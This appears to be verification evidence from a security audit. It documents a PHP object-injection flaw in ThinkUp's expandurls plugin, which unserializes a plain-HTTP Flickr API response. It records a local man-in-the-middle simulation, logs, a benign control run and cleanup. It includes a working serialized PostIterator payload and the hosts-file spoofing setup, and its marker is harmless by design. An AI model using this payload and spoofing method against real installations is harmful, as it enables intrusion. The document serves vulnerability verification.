@@ -1,0 +1,111 @@
+TU-01 VERIFICATION EVIDENCE
+===========================
+Target:       ThinkUp (expandurls plugin) - deserialization of attacker-controlled
+              Flickr API response
+Vulnerable:   webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php:60
+              (unserialize($resp) on plain-HTTP http://api.flickr.com response, line 58)
+POP entry:    webapp/_lib/model/class.PostIterator.php:124 (__destruct),
+              sink call $this->stmt->closeCursor() at line 127
+Date:         2026-09-27
+Environment:  Windows 10 x64, portable PHP 7.4.33 CLI (local path <REDACTED>, curl ext),
+              Python 3.12 MITM simulation server on 127.0.0.1:80
+
+METHOD (on-path attacker simulation, no ThinkUp source modified)
+----------------------------------------------------------------
+1. The Windows hosts file was temporarily pinned:
+       127.0.0.1 api.flickr.com   # TU-01 stage3 MITM simulation (temp, removed after test)
+   Resolution proof (post-pin, DNS cache flushed):
+       Ping api.flickr.com [127.0.0.1]
+2. A local HTTP server (env/serve_payload.py) listened on 127.0.0.1:80 and answered
+   every GET with raw attacker bytes -> the PHP process's plain-HTTP request to
+   http://api.flickr.com/services/rest/ landed on the attacker server. This is
+   byte-for-byte equivalent to an on-path (MITM/ARP/DNS-spoofing) attacker position
+   for a plaintext http:// endpoint (CVSS AV:A/AC:H).
+3. env/harness.php includes the REAL, UNMODIFIED files from the audited repo:
+       repos/ThinkUp/webapp/_lib/class.Utils.php                                 (Utils::getURLContents, verbatim)
+       repos/ThinkUp/webapp/_lib/model/class.PostIterator.php                    (gadget class)
+       repos/ThinkUp/webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php (vulnerable class)
+   Only Logger is stubbed (log sink; real Logger only writes log files).
+   Entry: FlickrAPIAccessor->getFlickrPhotoSource('http://flic.kr/p/2m4yAbC')
+   with api_key 'TU01TESTKEY' (mirrors the plugin's runtime call from
+   ExpandURLsPlugin.php:271 expandFlickrThumbnail()).
+4. Attacker payload served (env/payload-attacker.bin, 69 bytes):
+   O:12:"PostIterator":1:{s:18:"\0PostIterator\0stmt";O:8:"stdClass":0:{}}
+
+RUN 1 - ATTACKER RESPONSE (object injection + POP entry)
+--------------------------------------------------------
+harness.log (written by the REAL FlickrAPIAccessor via Logger calls, lines 42/56):
+    15:47:43 [logInfo] Flickr API key set
+    15:47:43 [logInfo] Flickr API call: http://api.flickr.com/services/rest/?method=flickr.photos.getSizes&photo_id=51236135968&api_key=TU01TESTKEY&format=php_serial
+    ^ note: plain http:// scheme (line 29 default), photo_id derived from the
+      flic.kr short id by base_decode() - confirms real code path through lines 43-54.
+
+MITM server access log:
+    MITM-SERVER: served 69 attacker bytes to 127.0.0.1 for GET /services/rest/?method=flickr.photos.getSizes&photo_id=51236135968&api_key=TU01TESTKEY&format=php_serial
+    ^ confirms the request went over plaintext HTTP to api.flickr.com and the
+      attacker controlled 100% of the response body.
+
+php.exe output (abridged; duplicate display_errors blocks removed):
+    [harness] real class.FlickrAPIAccessor.php loaded, unmodified
+    [harness] $api_url value (line 29): 'http://api.flickr.com/services/rest/?'
+    [harness] calling getFlickrPhotoSource('http://flic.kr/p/2m4yAbC')
+    PHP Fatal error:  Uncaught Error: Cannot use object of type PostIterator as array
+        in .../webapp/plugins/expandurls/model/class.FlickrAPIAccessor.php:62
+    Stack trace:
+    #0 .../harness.php(42): FlickrAPIAccessor->getFlickrPhotoSource('http://flic.kr/...')
+
+    Next Error: Call to undefined method stdClass::closeCursor()
+        in .../webapp/_lib/model/class.PostIterator.php:127
+    Stack trace:
+    #0 .../harness.php(42): PostIterator->__destruct()
+
+MARKER ANALYSIS
+---------------
+* Fatal at class.FlickrAPIAccessor.php:62 ($fphoto['stat']) proves unserialize() at
+  line 60 returned a fully instantiated attacker-chosen PostIterator object built
+  from the network response body (marker 1: object injection confirmed).
+* "Next Error: Call to undefined method stdClass::closeCursor()" raised from
+  PostIterator->__destruct() (declared line 124, sink line 127) proves the
+  destructor POP entry fires on attacker-controlled data during request shutdown
+  (marker 2). In the real application the same unserialize() runs inside the
+  crawler process where ThinkUp's autoloader exposes its full class set,
+  including PostIterator (used by the crawler itself to iterate posts).
+* The error-based marker is harmless: no file writes, no command execution,
+  process exit 255 only.
+
+RUN 2 - CONTROL, BENIGN RESPONSE (differential)
+-----------------------------------------------
+Server restarted serving a well-formed Flickr php_serial error
+(env/payload-benign.bin): a:2:{s:4:"stat";s:4:"fail";s:7:"message";s:15:"Invalid api key";}
+harness.log:
+    15:48:56 [logInfo] Flickr API key set
+    15:48:56 [logInfo] Flickr API call: http://api.flickr.com/services/rest/?method=flickr.photos.getSizes&photo_id=51236135968&api_key=TU01TESTKEY&format=php_serial
+    15:48:56 [logInfo] ERROR: 'Invalid api key'
+php.exe output (abridged):
+    [harness] returned: array (
+      'image_src' => '',
+      'error' => 'Invalid api key',
+    )
+    [harness] end of script; destructors run at shutdown
+    (exit 0, no fatal, destructor branch not taken)
+=> The fatal path in RUN 1 is caused specifically by attacker-controlled response
+   bytes, not by the environment.
+
+TRIGGER-CHAIN REACHABILITY (source-level, repo line refs)
+---------------------------------------------------------
+Crawler crawl run -> ExpandURLsPlugin::expand() (class.ExpandURLsPlugin.php)
+  -> expandOriginalURLs($flickr_api_key) (line ~110)
+  -> link with prefix 'http://flic.kr/' (line 146) -> expandFlickrThumbnail() (line 268)
+  -> FlickrAPIAccessor->getFlickrPhotoSource($flickr_link) (line 271)
+  -> unserialize($resp) at class.FlickrAPIAccessor.php:60  [DYNAMICALLY CONFIRMED]
+Links come from tu_links (getLinksToExpand/getLinksToExpandForInstances), i.e. any
+crawled post text containing an http://flic.kr/p/... link. Plugin must be enabled
+and a Flickr API key configured (getFlickrPhotoSource early-returns otherwise).
+
+CLEANUP PERFORMED
+-----------------
+- hosts entry "127.0.0.1 api.flickr.com" removed, DNS cache flushed
+- MITM simulation server stopped
+- payload.bin restored to attacker version for archival; payload copies kept:
+  payload-attacker.bin (69 bytes) / payload-benign.bin (66 bytes)
+- No temporary MySQL/DB instances were created (harness needs none).
